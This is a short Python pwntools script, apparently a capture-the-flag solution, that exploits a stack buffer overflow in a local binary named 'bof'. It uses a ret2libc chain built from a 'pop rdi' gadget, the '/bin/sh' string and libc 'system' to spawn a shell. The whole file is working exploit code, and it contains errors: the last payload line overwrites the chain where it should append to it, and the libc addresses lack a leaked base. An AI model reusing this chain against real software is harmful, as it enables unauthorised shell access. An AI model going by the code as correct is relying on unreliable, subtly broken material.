from pwn import *
context(log_level='debug')

p = process('./bof')
elf=ELF('./bof')
libc=ELF('./libc-2.27.so')

#0x00000000004011ab : pop rdi ; ret
pop_rdi=0x00000000004011ab
main = 0x401122
system_libc = libc.symbols["system"]

#puts_got = elf.got["puts"] # 0x0804A01C
#print "puts_got : " + hex(puts_got)

#puts_plt = elf.plt['puts'] # 0x80483f0
#print "puts_plt : " + hex(puts_plt)

#puts_libc = libc.symbols['puts'] # 0x5fca0
#print "puts_libc : " + hex(puts_libc)

binsh_libc = libc.search("/bin/sh").next() # 0x15ba0b
print "binsh_libc : " + hex(binsh_libc)



payload='a'*136
payload+=p64(pop_rdi)
payload+=p64(binsh_libc)
payload=p64(system_libc)

#p.recvline()
p.sendline(payload)

p.interactive()


